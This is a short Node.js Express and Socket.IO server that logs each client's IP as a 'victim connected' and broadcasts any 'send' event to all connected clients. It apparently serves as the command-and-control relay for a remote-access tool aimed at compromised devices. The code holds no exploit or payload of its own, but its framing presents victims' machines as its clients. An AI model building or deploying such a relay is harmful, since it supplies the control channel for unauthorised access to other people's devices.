let app = require('express')(),
    http = require('http').createServer(app),
    io = require('socket.io')(http, {
        pingInterval: 10000
    });

const port = 3000,
    path = require('path');

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname + '/index.html'))
});

http.listen(port, function () {
    console.log('Socket-Server app is running on port ' + port)
});

io.on('connection', (socket) => {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    var country = "Indonesia";

    console.log('victim connected ' + ip);

    socket.on("join", (data) => {
        console.log(data);
    });

    socket.on("send", (data) => {
        io.emit("send", data);
    });

    socket.on('disconnect', () => {
        console.log('victim disconnected ' + ip);
    });
});